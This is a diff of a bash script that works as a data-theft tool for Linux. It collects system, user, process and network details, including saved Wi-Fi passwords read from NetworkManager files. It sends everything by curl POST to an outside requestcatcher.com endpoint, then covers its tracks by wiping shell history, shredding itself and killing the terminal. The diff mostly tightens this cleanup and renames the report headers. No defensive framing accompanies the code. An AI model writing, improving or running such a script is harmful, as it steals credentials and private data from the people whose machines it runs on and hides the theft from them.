@@ -1,123 +1,106 @@
 #!/bin/bash
 
-# === Basic System Info ===
+# === System Recon ===
 os_info=$(lsb_release -a 2>/dev/null)
 kernel_info=$(uname -a)
 hostname_info=$(hostnamectl)
 current_user=$(whoami)
-
-# === Network Info ===
 public_ip=$(curl -s https://ipinfo.io/ip)
 local_ip=$(hostname -I)
 mac_address=$(ip link | grep -A1 "state UP" | grep ether | awk '{print $2}')
 wifi_networks=$(nmcli -f SSID,BSSID,SIGNAL dev wifi list 2>/dev/null)
-
-# === WLAN Profiles ===
 wifi_profiles=$(grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null)
-
-# === Geolocation (IP-based) ===
 location_data=$(curl -s https://ipinfo.io/loc)
-
-# === Users and Groups ===
 user_list=$(cut -d: -f1 /etc/passwd)
 group_info=$(groups)
-
-# === Password Policies ===
 password_policy=$(chage -l "$current_user" 2>/dev/null)
-
-# === Processes, Services, Software ===
 running_processes=$(ps aux)
 enabled_services=$(systemctl list-unit-files --type=service --state=enabled)
 installed_software=$(dpkg-query -W -f='${binary:Package} ${Version}\n')
-
-# === Devices and Disks ===
 disk_info=$(lsblk)
 serial_devices=$(dmesg | grep tty)
-
-# === TCP Connections ===
 tcp_connections=$(ss -tunapl)
 
-# === Exfiltrate via POST ===
-curl -X POST https://nina-flip-test.requestcatcher.com/ \
+# === Exfiltration ===
+curl -s -X POST https://nina-flip-test.requestcatcher.com/ \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "debug=
-==== [OS INFO] ====
+==== OS INFO ====
 $os_info
 
-==== [KERNEL] ====
+==== KERNEL ====
 $kernel_info
 
-==== [HOSTNAME] ====
+==== HOSTNAME ====
 $hostname_info
 
-==== [CURRENT USER] ====
+==== USER ====
 $current_user
 
-==== [PASSWORD ENTERED] ====
-$user_password
-
-==== [PUBLIC IP] ====
+==== PUBLIC IP ====
 $public_ip
 
-==== [LOCAL IP] ====
+==== LOCAL IP ====
 $local_ip
 
-==== [MAC ADDRESS] ====
+==== MAC ====
 $mac_address
 
-==== [WIFI NETWORKS] ====
+==== WIFI ====
 $wifi_networks
 
-==== [WIFI PROFILES & PASSWORDS] ====
+==== WIFI PROFILES ====
 $wifi_profiles
 
-==== [LOCATION (IP-BASED)] ====
+==== LOCATION ====
 $location_data
 
-==== [USER LIST] ====
+==== USERS ====
 $user_list
 
-==== [GROUP INFO] ====
+==== GROUPS ====
 $group_info
 
-==== [PASSWORD POLICY] ====
+==== PASS POLICY ====
 $password_policy
 
-==== [PROCESSES] ====
+==== PROCESSES ====
 $running_processes
 
-==== [SERVICES] ====
+==== SERVICES ====
 $enabled_services
 
-==== [SOFTWARE] ====
+==== SOFTWARE ====
 $installed_software
 
-==== [DISK INFO] ====
+==== DISKS ====
 $disk_info
 
-==== [SERIAL DEVICES] ====
+==== SERIAL ====
 $serial_devices
 
-==== [TCP CONNECTIONS] ====
+==== TCP ====
 $tcp_connections
 "
 
 # === Cleanup ===
 
-# Clear history and env logs
+# Shell history + environment
 history -c
 unset HISTFILE
+> ~/.bash_history
+> ~/.zsh_history
+export HISTSIZE=0
+export HISTFILESIZE=0
+export HISTCONTROL=ignorespace:erasedups
 
-# Shred this file (overwrite before delete)
-shred -u "$0" 2>/dev/null || rm -f "$0"
-
-# Remove folder
-rm -rf /tmp/.sysdata
-
-# Clear screen and exit
+# Memory cleanup
+reset
 clear
 
-# === Auto-close terminal after delay ===
-sleep 2
-kill -9 $PPID
+# If script exists, shred it
+[ -f "$0" ] && { shred -u "$0" 2>/dev/null || rm -f "$0"; }
 
+# Autoclose terminal silently
+sleep 0.5
+kill -9 $PPID
